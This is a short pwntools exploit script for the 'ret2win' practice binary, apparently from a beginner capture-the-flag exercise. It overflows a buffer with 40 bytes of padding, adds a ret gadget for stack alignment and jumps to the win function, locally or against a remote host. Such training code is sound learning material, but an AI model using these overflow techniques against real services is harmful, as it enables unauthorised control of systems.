#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

exe = "./ret2win"
elf = context.binary = ELF(exe)

io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "b *main")

payload = flat(
	cyclic(40, n=8),
	0x000000000040053e, # adding a simple ret gadget
	elf.sym.ret2win
)

io.sendlineafter(b"> ", payload)

io.interactive()
